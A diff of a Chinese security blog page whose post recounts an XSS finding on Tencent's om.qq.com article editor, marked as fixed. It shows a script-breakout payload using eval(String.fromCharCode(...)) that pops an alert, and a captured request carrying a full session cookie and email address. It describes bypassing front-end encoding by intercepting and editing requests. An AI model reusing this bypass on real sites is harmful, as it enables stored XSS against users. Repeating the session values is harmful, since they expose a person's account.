@@ -1,17 +1,20 @@
+
+
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="真正领会了渗透测试中的骚思路后才能挖掘出更多有意思的漏洞，这次的漏洞挖掘是我最近挖的一个觉得比较有意思的漏洞，分析在这里，这个世界从来不缺少创作者。 事情发生在2018年11月01日晚上，地点：北京 天气有点冷。沉浸在对自己的前途一片黑暗之中，无法自拔。于是，又当起了XSSer。 0x01   已修复 https://om.qq.com/article/preview?articleId=2018">
+<html lang="">
+<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <meta name="description" content="">
+    <title>从SELF-XSS到存储型XSS/附绕过token分析过程 | c1y2m3’blog</title>
+
+    <!-- Open Graph -->
+    <meta name="description" content="&amp;#x771F;&amp;#x6B63;&amp;#x9886;&amp;#x4F1A;&amp;#x4E86;&amp;#x6E17;&amp;#x900F;&amp;#x6D4B;&amp;#x8BD5;&amp;#x4E2D;&amp;#x7684;&amp;#x9A9A;&amp;#x601D;&amp;#x8DEF;&amp;#x540E;&amp;#x624D;&amp;#x80FD;&amp;#x6316;&amp;#x6398;&amp;#x51FA;&amp;#x66F4;&amp;#x591A;&amp;#x6709;&amp;#x610F;&amp;#x601D;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="从SELF-XSS到存储型XSS&#x2F;附绕过token分析过程">
 <meta property="og:url" content="http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="真正领会了渗透测试中的骚思路后才能挖掘出更多有意思的漏洞，这次的漏洞挖掘是我最近挖的一个觉得比较有意思的漏洞，分析在这里，这个世界从来不缺少创作者。 事情发生在2018年11月01日晚上，地点：北京 天气有点冷。沉浸在对自己的前途一片黑暗之中，无法自拔。于是，又当起了XSSer。 0x01   已修复 https://om.qq.com/article/preview?articleId=2018">
+<meta property="og:description" content="&amp;#x771F;&amp;#x6B63;&amp;#x9886;&amp;#x4F1A;&amp;#x4E86;&amp;#x6E17;&amp;#x900F;&amp;#x6D4B;&amp;#x8BD5;&amp;#x4E2D;&amp;#x7684;&amp;#x9A9A;&amp;#x601D;&amp;#x8DEF;&amp;#x540E;&amp;#x624D;&amp;#x80FD;&amp;#x6316;&amp;#x6398;&amp;#x51FA;&amp;#x66F4;&amp;#x591A;&amp;#x6709;&amp;#x610F;&amp;#x601D;">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://i.3001.net/uploads/Up_imgs/20181101-5b7870dc0c92469e0599f7a2a6415c62.png">
 <meta property="og:image" content="http://i.3001.net/uploads/Up_imgs/20181101-da9853a424ce04ed7cde3823ca7ae7c6.png!small">
@@ -24,247 +27,257 @@
 <meta property="og:updated_time" content="2019-01-19T04:14:53.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="从SELF-XSS到存储型XSS&#x2F;附绕过token分析过程">
-<meta name="twitter:description" content="真正领会了渗透测试中的骚思路后才能挖掘出更多有意思的漏洞，这次的漏洞挖掘是我最近挖的一个觉得比较有意思的漏洞，分析在这里，这个世界从来不缺少创作者。 事情发生在2018年11月01日晚上，地点：北京 天气有点冷。沉浸在对自己的前途一片黑暗之中，无法自拔。于是，又当起了XSSer。 0x01   已修复 https://om.qq.com/article/preview?articleId=2018">
+<meta name="twitter:description" content="&amp;#x771F;&amp;#x6B63;&amp;#x9886;&amp;#x4F1A;&amp;#x4E86;&amp;#x6E17;&amp;#x900F;&amp;#x6D4B;&amp;#x8BD5;&amp;#x4E2D;&amp;#x7684;&amp;#x9A9A;&amp;#x601D;&amp;#x8DEF;&amp;#x540E;&amp;#x624D;&amp;#x80FD;&amp;#x6316;&amp;#x6398;&amp;#x51FA;&amp;#x66F4;&amp;#x591A;&amp;#x6709;&amp;#x610F;&amp;#x601D;">
 <meta name="twitter:image" content="http://i.3001.net/uploads/Up_imgs/20181101-5b7870dc0c92469e0599f7a2a6415c62.png">
+
+    <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Person",
+  "email": "mailto:",
+  "image": "",
+  "name": "John Doe",
+  "url": "http://yoursite.com"
+}
+</script>
+    <script>
+    var algoliaEnabled = false;
+    
+</script>
+
+    
+
     
     
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+    
+    
+    
+        <!-- stylesheets list from config.yml -->
         
-          
-              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
-          
+        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
         
+        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
         
-          
-            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
-          
+        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
         
     
-    <!-- title -->
-    <title>从SELF-XSS到存储型XSS/附绕过token分析过程</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
-    <!-- persian styles -->
-    
-      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
-    
-    <!-- rss -->
-    
-    
+
 </head>
+<body id="body" style="margin-bottom: 0;" class="pushable">
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </span>
-    <br>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2018/11/14/如何有效防御CSRF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2018/10/18/浅谈跨站脚本绕过和防御/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&text=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&is_video=false&description=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=从SELF-XSS到存储型XSS/附绕过token分析过程&body=Check out this article: http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&name=从SELF-XSS到存储型XSS/附绕过token分析过程&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
+    <div class="ui top fixed menu">
+        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
+    </div>
 
+    <div id="menu-sidebar" class="ui left vertical sidebar menu">
+
+    <div id="sidebar-top">
+        <div class="content">
+            <h3>c1y2m3’blog</h3>
+        </div>
     </div>
-    <div id="toc">
-      
+    <div class="ui container sidebar-card">
+    <div class="ui people shape content">
+        <div class="active side">
+            <div class="ui card">
+                <div class="image">
+                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
+                </div>
+                <div class="content">
+                    <a class="header">John Doe</a>
+                    
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                        
+                    </div>
+
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-  </span>
+
+
 </div>
 
     
-    <div class="content index py4">
-        
-        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-  <header>
     
-    <h1 class="posttitle" itemprop="name headline">
-        从SELF-XSS到存储型XSS/附绕过token分析过程
-    </h1>
+
+    
+
+    
+    <a href="/index.html" class="item">
+        <i class="home icon"></i>
+        HOME
+    </a>
+
+    
+
+    
+</div>
+
+    <div class="pusher body-content">
+        <div id="content" class="ui main container">
+            <!--<div class="ui one column grid">-->
+                <!--<div class="column">-->
+                    <!--<div class="ui main container">-->
+                        <div id="post-从SELF-XSS到存储型XSS-附绕过token分析过程 " class="ui main container article-type-post">
+
+    
+
+    <div class="ui divided grid">
+
+        <div class="two column row" id="article-content">
+
+            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
+                
+
+<h1 class="ui header">
+    
+    从SELF-XSS到存储型XSS/附绕过token分析过程
+</h1>
 
 
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-        <span itemprop="name">c1y2m3’blog</span>
-      </span>
-      
-    <div class="postdate">
-        <time datetime="2018-11-01T15:03:00.000Z" itemprop="datePublished">2018-11-01</time>
-    </div>
+                <div class="article-inner">
 
-
-      
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <p>真正领会了渗透测试中的骚思路后才能挖掘出更多有意思的漏洞，这次的漏洞挖掘是我最近挖的一个觉得比较有意思的漏洞，分析在这里，这个世界从来不缺少创作者。</p>
-<p>事情发生在2018年11月01日晚上，地点：北京 天气有点冷。<br>沉浸在对自己的前途一片黑暗之中，无法自拔。于是，又当起了XSSer。</p>
-<p>0x01   已修复</p>
-<p><a href="https://om.qq.com/article/preview?articleId=20181101A1AC67" target="_blank" rel="noopener">https://om.qq.com/article/preview?articleId=20181101A1AC67</a><br>在文章正文处输入fuzz，发现输出在script标签下、script标签下从来不缺绕过的方法，然后输入payload，点击预览：</p>
-<p>参考：<a href="https://e7t65s.github.io/c1y2m3.github.io/2018/10/18/%E6%B5%85%E8%B0%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E7%BB%95%E8%BF%87%E5%92%8C%E9%98%B2%E5%BE%A1/" target="_blank" rel="noopener">浅谈跨站脚本绕过和防御 </a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​1&apos;&#125;;eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41));var pass=&#123;&apos;id&apos;: &apos;1</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-5b7870dc0c92469e0599f7a2a6415c62.png" alt=""><br>发现无法闭合，被过滤的明明白白了，可惜峰回路转，于是就有了下面的故事<br>抓取了预览包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=1 HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 628</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pgv_pvi=20205568; ptui_loginuin=49738195; pt2gguin=o0049738195; RK=IE7gjzyEER; ptcz=e26757456ce43cd621229cf0277060fe320cadbdb9fe960be031819bb0ff2445; pgv_pvid=2078291729; o_cookie=49738195; pac_uid=1_49738195; ts_uid=3270008848; tvfe_boss_uuid=b1944c47bc974c16; TSID=a6sjhfrnokjepmuvn1el6qn6h6; wxky=1; omtoken=8d3093de7a; omtoken_expire=1541058741; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; rmod=1; pgv_info=ssid=s7825261201; alertclicked=%7C%7C; 9e67236d07bdc7152e6e2b42b7f00f43=e6d7af23146a99ae80577cf63db0ae6875312071a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522vuexdDhyUgp6cIaVLUo0Dw00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=%3Cp%3E1%26%2339%3B%7D%3Beval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C49%2C50%2C51%2C41))%3Bvar+pass%3D%7B%26%2339%3Bid%26%2339%3B%3A+%26%2339%3B1%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3Cbr%2F%3E%3C%2Fp%3E&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A10YRL&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure></p>
-<p>发现在提交数据后，前端已经做了实体编码了。<br>在拦截之后修改content的值 ，然后Forward ~<br>返回包如下：<br><img src="http://i.3001.net/uploads/Up_imgs/20181101-da9853a424ce04ed7cde3823ca7ae7c6.png!small" alt=""><br><img src="http://i.3001.net/uploads/Up_imgs/20181101-fa790e1cceee92203177f6beeff436e4.png!small" alt=""></p>
-<p>成功弹窗~ So，推测<br>代码逻辑：客户端 -&gt; 前端进行编码 -&gt; 服务器接受参数时(未过滤)<br>于是 通过 客户端 -&gt; 前端进行编码 -&gt; 通过中间人修改参数 -&gt; 发送 -&gt; 服务器接受 -&gt; 渲染到页面触发XSS</p>
-<p>但是心想这只是个预览界面，无法交互道，别人是没办法访问的，相当于SELF-XSS，利用率不高，那我就发布上线吧，利用同样流程 </p>
+                    <div class="article-entry" itemprop="articleBody">
+                        
+                        <p>&#x771F;&#x6B63;&#x9886;&#x4F1A;&#x4E86;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x4E2D;&#x7684;&#x9A9A;&#x601D;&#x8DEF;&#x540E;&#x624D;&#x80FD;&#x6316;&#x6398;&#x51FA;&#x66F4;&#x591A;&#x6709;&#x610F;&#x601D;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x8FD9;&#x6B21;&#x7684;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x662F;&#x6211;&#x6700;&#x8FD1;&#x6316;&#x7684;&#x4E00;&#x4E2A;&#x89C9;&#x5F97;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x5206;&#x6790;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x8FD9;&#x4E2A;&#x4E16;&#x754C;&#x4ECE;&#x6765;&#x4E0D;&#x7F3A;&#x5C11;&#x521B;&#x4F5C;&#x8005;&#x3002;</p>
+<p>&#x4E8B;&#x60C5;&#x53D1;&#x751F;&#x5728;2018&#x5E74;11&#x6708;01&#x65E5;&#x665A;&#x4E0A;&#xFF0C;&#x5730;&#x70B9;&#xFF1A;&#x5317;&#x4EAC; &#x5929;&#x6C14;&#x6709;&#x70B9;&#x51B7;&#x3002;<br>&#x6C89;&#x6D78;&#x5728;&#x5BF9;&#x81EA;&#x5DF1;&#x7684;&#x524D;&#x9014;&#x4E00;&#x7247;&#x9ED1;&#x6697;&#x4E4B;&#x4E2D;&#xFF0C;&#x65E0;&#x6CD5;&#x81EA;&#x62D4;&#x3002;&#x4E8E;&#x662F;&#xFF0C;&#x53C8;&#x5F53;&#x8D77;&#x4E86;XSSer&#x3002;</p>
+<p>0x01   &#x5DF2;&#x4FEE;&#x590D;</p>
+<p><a href="https://om.qq.com/article/preview?articleId=20181101A1AC67" target="_blank" rel="noopener">https://om.qq.com/article/preview?articleId=20181101A1AC67</a><br>&#x5728;&#x6587;&#x7AE0;&#x6B63;&#x6587;&#x5904;&#x8F93;&#x5165;fuzz&#xFF0C;&#x53D1;&#x73B0;&#x8F93;&#x51FA;&#x5728;script&#x6807;&#x7B7E;&#x4E0B;&#x3001;script&#x6807;&#x7B7E;&#x4E0B;&#x4ECE;&#x6765;&#x4E0D;&#x7F3A;&#x7ED5;&#x8FC7;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x8F93;&#x5165;payload&#xFF0C;&#x70B9;&#x51FB;&#x9884;&#x89C8;&#xFF1A;</p>
+<p>&#x53C2;&#x8003;&#xFF1A;<a href="https://e7t65s.github.io/c1y2m3.github.io/2018/10/18/%E6%B5%85%E8%B0%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E7%BB%95%E8%BF%87%E5%92%8C%E9%98%B2%E5%BE%A1/" target="_blank" rel="noopener">&#x6D45;&#x8C08;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x7ED5;&#x8FC7;&#x548C;&#x9632;&#x5FA1; </a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x200B;1&apos;};eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41));var pass={&apos;id&apos;: &apos;1</span><br></pre></td></tr></table></figure>
+<p><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-5b7870dc0c92469e0599f7a2a6415c62.png"><img src="http://i.3001.net/uploads/Up_imgs/20181101-5b7870dc0c92469e0599f7a2a6415c62.png" alt="" class="ui centered image"></a><br>&#x53D1;&#x73B0;&#x65E0;&#x6CD5;&#x95ED;&#x5408;&#xFF0C;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x660E;&#x660E;&#x767D;&#x767D;&#x4E86;&#xFF0C;&#x53EF;&#x60DC;&#x5CF0;&#x56DE;&#x8DEF;&#x8F6C;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x6709;&#x4E86;&#x4E0B;&#x9762;&#x7684;&#x6545;&#x4E8B;<br>&#x6293;&#x53D6;&#x4E86;&#x9884;&#x89C8;&#x5305;&#xFF1A;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=1 HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 628</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pgv_pvi=20205568; ptui_loginuin=49738195; pt2gguin=o0049738195; RK=IE7gjzyEER; ptcz=e26757456ce43cd621229cf0277060fe320cadbdb9fe960be031819bb0ff2445; pgv_pvid=2078291729; o_cookie=49738195; pac_uid=1_49738195; ts_uid=3270008848; tvfe_boss_uuid=b1944c47bc974c16; TSID=a6sjhfrnokjepmuvn1el6qn6h6; wxky=1; omtoken=8d3093de7a; omtoken_expire=1541058741; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; rmod=1; pgv_info=ssid=s7825261201; alertclicked=%7C%7C; 9e67236d07bdc7152e6e2b42b7f00f43=e6d7af23146a99ae80577cf63db0ae6875312071a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522vuexdDhyUgp6cIaVLUo0Dw00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=%3Cp%3E1%26%2339%3B%7D%3Beval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C49%2C50%2C51%2C41))%3Bvar+pass%3D%7B%26%2339%3Bid%26%2339%3B%3A+%26%2339%3B1%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3Cbr%2F%3E%3C%2Fp%3E&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A10YRL&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure></p>
+<p>&#x53D1;&#x73B0;&#x5728;&#x63D0;&#x4EA4;&#x6570;&#x636E;&#x540E;&#xFF0C;&#x524D;&#x7AEF;&#x5DF2;&#x7ECF;&#x505A;&#x4E86;&#x5B9E;&#x4F53;&#x7F16;&#x7801;&#x4E86;&#x3002;<br>&#x5728;&#x62E6;&#x622A;&#x4E4B;&#x540E;&#x4FEE;&#x6539;content&#x7684;&#x503C; &#xFF0C;&#x7136;&#x540E;Forward ~<br>&#x8FD4;&#x56DE;&#x5305;&#x5982;&#x4E0B;&#xFF1A;<br><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-da9853a424ce04ed7cde3823ca7ae7c6.png!small"><img src="http://i.3001.net/uploads/Up_imgs/20181101-da9853a424ce04ed7cde3823ca7ae7c6.png!small" alt="" class="ui centered image"></a><br><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-fa790e1cceee92203177f6beeff436e4.png!small"><img src="http://i.3001.net/uploads/Up_imgs/20181101-fa790e1cceee92203177f6beeff436e4.png!small" alt="" class="ui centered image"></a></p>
